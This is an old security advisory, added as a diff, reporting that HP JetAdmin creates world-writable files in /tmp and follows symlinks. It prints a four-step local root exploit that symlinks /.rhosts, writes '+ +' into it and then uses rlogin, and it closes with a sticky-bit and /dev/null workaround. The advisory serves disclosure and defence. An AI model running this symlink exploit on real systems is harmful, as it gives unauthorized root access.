@@ -1,0 +1,27 @@
+r00t advisory						[ hp jetadmin   ]
+							[ Aug 26 1996   ]
+
+-- Synposis
+There exists a vunerability in the hp jetadmin software that will allow any
+user to obtain r00t access or arbitrarily overwrite any file on that targeted
+system.  Hp jetadmin requires a user to be r00t in order to modify printer 
+configurations.  Also the jetadmin software creates mode 666 files in 
+/tmp/jadump and /tmp/jetadmin.log and will easily follow a symbolic link to
+it's target.
+
+-- Exploitability
+The exploit is also absurdly simple:
+$ ln -s /.rhosts /tmp/jetadmin.log
+# wait for system administrator to manage the queue or modify printer status
+$ echo "+ +" >/.rhosts
+$ rlogin -l localhost root
+
+-- Fixes ?
+Some possible fixes to this problem are to use a nice dot-matrix printer 
+without the jetadmin software. Or if that isn't kosher enough and you still
+insist on using the jetadmin software as root:
+
+$ cd /tmp
+$ chmod +t .
+$ ln -s /dev/null jetadmin.log
+$ ln -s /dev/null jadump
